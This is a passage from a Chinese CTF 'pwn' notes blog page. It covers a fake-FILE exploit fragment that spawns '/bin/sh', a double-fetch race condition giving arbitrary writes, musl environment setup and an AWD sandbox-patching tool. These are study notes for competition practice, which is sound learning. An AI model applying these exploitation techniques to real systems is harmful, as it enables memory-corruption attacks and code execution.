</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=err>&#39;</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>sh</span><span class=err>\</span><span class=n>x00</span><span class=err>&#39;</span></span></span></code></pre></div></div><p>glibc-2.37 开始删除了 <code>_IO_helper_jumps</code> ，方法失效</p><h2 id=条件竞争>条件竞争</h2><h3 id=double-fetch>Double Fetch</h3><p><strong>漏洞点</strong></p><p>第一次文件读到内存中判断 count 大小，而进入 else 后又执行了读文件到内存，此时不判断 count 大小</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C++"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=c1>// 内存中logcount紧挨guest名字后
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>file_content_2_memory</span><span class=p>(</span><span class=n>a</span><span class=p>);</span> <span class=c1>// 读取本地文件内容到内存中
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span> <span class=o>*</span><span class=p>(</span><span class=n>a</span> <span class=o>+</span> <span class=mi>64</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>4</span> <span class=p>){</span> <span class=c1>// a+64存储logcount
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>file_content_2_memory</span><span class=p>(</span><span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)(</span><span class=mi>8</span> <span class=o>*</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=kr>__int16</span> <span class=o>*</span><span class=p>)(</span><span class=n>a</span> <span class=o>+</span> <span class=mi>64</span><span class=p>)</span> <span class=o>+</span> <span class=mi>2LL</span><span class=p>)</span> <span class=o>+</span> <span class=n>a</span> <span class=o>+</span> <span class=mi>8</span><span class=p>),</span> <span class=mi>8uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 向第logcount偏移的位置读入guest的名字
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=o>++*</span><span class=p>(</span><span class=n>a</span> <span class=o>+</span> <span class=mi>64</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>memory_2_file</span><span class=p>(</span><span class=n>a</span><span class=p>);</span> <span class=c1>// 将内存中数据写入本地文件中
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span></span></span></code></pre></div></div><p>利用：</p><ul><li><p>第 1 个进程准备第五次写入而到达代码第 6 行时，开启第 2 和第 3 个进程绕过 2-3 行的判断到达第 6 行，第 1 个进程输入第五个值后退出</p></li><li><p>第 2 个进程写入值将覆盖 logcount，达成<strong>任意写</strong>，第 3 个进程写入值将通过 read 修改 memory[logcount]内容达成<strong>任意地址写</strong></p></li></ul><img src=/img/pwn_note.zh-cn.assets/image-20241101000216869.png alt=图片无法加载><h2 id=musl-pwn>musl pwn</h2><h3 id=环境>环境</h3><p>下载<a href=https://pkgs.org/download/musl target=_blank rel="noopener noreffer">安装包</a>，<a href=https://git.musl-libc.org/cgit/musl target=_blank rel="noopener noreffer">源码</a></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo dpkg -i musl_1.1.xx-x_amd64.deb <span class=c1># 同样适用于Libc调试符号musl-dbgsymxxx.ddeb</span>
</span></span><span class=line><span class=cl><span class=c1># https://launchpad.net/ubuntu/</span>
</span></span><span class=line><span class=cl>sudo apt-get install -y musl musl-dev
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 使用patchelf将可执行文件ld更改为对应ld文件:ld-musl-x86_64.so.1，否则会卡在syscall指令某处</span></span></span></code></pre></div></div><h2 id=awd>AWD</h2><h3 id=通防>通防</h3><p><strong>evilPatcher</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python evilPatcher.py elf sandboxs/xxx.asm <span class=m>1</span>
</span></span><span class=line><span class=cl><span class=c1># arg1: 想要patch的elf文件, arg2: 沙箱规则文件, 想输出更多过程在最后参数加上1</span></span></span></code></pre></div></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2025-05-24&nbsp;<a class=git-hash href=https://github.com/dillonzq/LoveIt/commit/eada9fe65f8f62547e9d526eec1ab795b4dd6bbd target=_blank title="commit by J-shiro(541737231@qq.com) eada9fe65f8f62547e9d526eec1ab795b4dd6bbd: add ctf, linux, language, old notes">
<i class="fas fa-hashtag fa-fw" aria-hidden=true></i>eada9fe</a></span></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=/pwn_note/index.md target=_blank>阅读原始文档</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="分享到 Facebook" data-sharer=facebook data-url=https://j-shiro.github.io/pwn_note/ data-hashtag=pwn><i class="fab fa-facebook-square fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="分享到 Line" data-sharer=line data-url=https://j-shiro.github.io/pwn_note/ data-title=PWN><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@14.9.0/icons/line.svg aria-hidden=true></i></a><a href=javascript:void(0); title="分享到 微博" data-sharer=weibo data-url=https://j-shiro.github.io/pwn_note/ data-title=PWN><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a><a href="https://t.me/share/url?url=https%3a%2f%2fj-shiro.github.io%2fpwn_note%2f&amp;text=PWN" target=_blank title="分享到 Telegram"><i class="fab fa-telegram fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/pwn/>Pwn</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/reverse_note/ class=prev rel=prev title=REVERSE><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>REVERSE</a>
<a href=/misc_note/ class=next rel=next title=MISC>MISC<i class="fas fa-angle-right fa-fw" aria-hidden=true></i></a></div></div><div id=comments><div id=valine class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>由 <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.143.1">Hugo</a> 强力驱动 | 主题 - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2019 - 2025</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>jshiro</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i></a></div><div id=fixed-buttons-hidden><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=/lib/valine/valine.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/katex.min.css><script src=https://cdn.jsdelivr.net/npm/valine@1.5.3/dist/Valine.min.js></script><script src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js></script><script src=https://cdn.jsdelivr.net/npm/algoliasearch@5.20.2/dist/lite/builds/browser.umd.min.js></script><script src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js></script><script src=https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/katex.min.js></script><script src=https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/contrib/auto-render.min.js></script><script src=https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/contrib/copy-tex.min.js></script><script src=https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/contrib/mhchem.min.js></script><script>window.config={comment:{valine:{appId:"QGzwQXOqs5JOhN4RGPOkR2mR-MdYXbMMI",appKey:"WBmoGyJtbqUswvfLh6L8iEBr",avatar:"mp",el:"#valine",emojiCDN:"https://cdn.jsdelivr.net/npm/emoji-datasource-google@15.1.2/img/google/64/",emojiMaps:{100:"1f4af.png",alien:"1f47d.png",anger:"1f4a2.png",angry:"1f620.png",anguished:"1f627.png",astonished:"1f632.png",black_heart:"1f5a4.png",blue_heart:"1f499.png",blush:"1f60a.png",bomb:"1f4a3.png",boom:"1f4a5.png",broken_heart:"1f494.png",brown_heart:"1f90e.png",clown_face:"1f921.png",cold_face:"1f976.png",cold_sweat:"1f630.png",confounded:"1f616.png",confused:"1f615.png",cry:"1f622.png",crying_cat_face:"1f63f.png",cupid:"1f498.png",dash:"1f4a8.png",disappointed:"1f61e.png",disappointed_relieved:"1f625.png",dizzy:"1f4ab.png",dizzy_face:"1f635.png",drooling_face:"1f924.png",exploding_head:"1f92f.png",expressionless:"1f611.png",face_vomiting:"1f92e.png",face_with_cowboy_hat:"1f920.png",face_with_hand_over_mouth:"1f92d.png",face_with_head_bandage:"1f915.png",face_with_monocle:"1f9d0.png",face_with_raised_eyebrow:"1f928.png",face_with_rolling_eyes:"1f644.png",face_with_symbols_on_mouth:"1f92c.png",face_with_thermometer:"1f912.png",fearful:"1f628.png",flushed:"1f633.png",frowning:"1f626.png",ghost:"1f47b.png",gift_heart:"1f49d.png",green_heart:"1f49a.png",grimacing:"1f62c.png",grin:"1f601.png",grinning:"1f600.png",hankey:"1f4a9.png",hear_no_evil:"1f649.png",heart:"2764-fe0f.png",heart_decoration:"1f49f.png",heart_eyes:"1f60d.png",heart_eyes_cat:"1f63b.png",heartbeat:"1f493.png",heartpulse:"1f497.png",heavy_heart_exclamation_mark_ornament:"2763-fe0f.png",hole:"1f573-fe0f.png",hot_face:"1f975.png",hugging_face:"1f917.png",hushed:"1f62f.png",imp:"1f47f.png",innocent:"1f607.png",japanese_goblin:"1f47a.png",japanese_ogre:"1f479.png",joy:"1f602.png",joy_cat:"1f639.png",kiss:"1f48b.png",kissing:"1f617.png",kissing_cat:"1f63d.png",kissing_closed_eyes:"1f61a.png",kissing_heart:"1f618.png",kissing_smiling_eyes:"1f619.png",laughing:"1f606.png",left_speech_bubble:"1f5e8-fe0f.png",love_letter:"1f48c.png",lying_face:"1f925.png",mask:"1f637.png",money_mouth_face:"1f911.png",nauseated_face:"1f922.png",nerd_face:"1f913.png",neutral_face:"1f610.png",no_mouth:"1f636.png",open_mouth:"1f62e.png",orange_heart:"1f9e1.png",partying_face:"1f973.png",pensive:"1f614.png",persevere:"1f623.png",pleading_face:"1f97a.png",pouting_cat:"1f63e.png",purple_heart:"1f49c.png",rage:"1f621.png",relaxed:"263a-fe0f.png",relieved:"1f60c.png",revolving_hearts:"1f49e.png",right_anger_bubble:"1f5ef-fe0f.png",robot_face:"1f916.png",rolling_on_the_floor_laughing:"1f923.png",scream:"1f631.png",scream_cat:"1f640.png",see_no_evil:"1f648.png",shushing_face:"1f92b.png",skull:"1f480.png",skull_and_crossbones:"2620-fe0f.png",sleeping:"1f634.png",sleepy:"1f62a.png",slightly_frowning_face:"1f641.png",slightly_smiling_face:"1f642.png",smile:"1f604.png",smile_cat:"1f638.png",smiley:"1f603.png",smiley_cat:"1f63a.png",smiling_face_with_3_hearts:"1f970.png",smiling_imp:"1f608.png",smirk:"1f60f.png",smirk_cat:"1f63c.png",sneezing_face:"1f927.png",sob:"1f62d.png",space_invader:"1f47e.png",sparkling_heart:"1f496.png",speak_no_evil:"1f64a.png",speech_balloon:"1f4ac.png","star-struck":"1f929.png",stuck_out_tongue:"1f61b.png",stuck_out_tongue_closed_eyes:"1f61d.png",stuck_out_tongue_winking_eye:"1f61c.png",sunglasses:"1f60e.png",sweat:"1f613.png",sweat_drops:"1f4a6.png",sweat_smile:"1f605.png",thinking_face:"1f914.png",thought_balloon:"1f4ad.png",tired_face:"1f62b.png",triumph:"1f624.png",two_hearts:"1f495.png",unamused:"1f612.png",upside_down_face:"1f643.png",weary:"1f629.png",white_frowning_face:"2639-fe0f.png",white_heart:"1f90d.png",wink:"1f609.png",woozy_face:"1f974.png",worried:"1f61f.png",yawning_face:"1f971.png",yellow_heart:"1f49b.png",yum:"1f60b.png",zany_face:"1f92a.png",zipper_mouth_face:"1f910.png",zzz:"1f4a4.png"},enableQQ:!1,highlight:!0,lang:"zh-CN",pageSize:10,placeholder:"你的评论 ...",recordIP:!0,serverURLs:"https://valine.hugoloveit.com",visitor:!0}},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!0,left:"\\begin{equation}",right:"\\end{equation}"},{display:!0,left:"\\begin{equation*}",right:"\\end{equation*}"},{display:!0,left:"\\begin{align}",right:"\\end{align}"},{display:!0,left:"\\begin{align*}",right:"\\end{align*}"},{display:!0,left:"\\begin{alignat}",right:"\\end{alignat}"},{display:!0,left:"\\begin{alignat*}",right:"\\end{alignat*}"},{display:!0,left:"\\begin{gather}",right:"\\end{gather}"},{display:!0,left:"\\begin{CD}",right:"\\end{CD}"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{algoliaAppID:"GZT24PWKNT",algoliaIndex:"index",algoliaSearchKey:"634ab679e825b815de2663de38908f9d",highlightTag:"em",maxResultLength:10,noResultsFound:"没有找到结果",snippetLength:50,type:"algolia"}}</script><script src=/js/theme.min.js></script></body></html>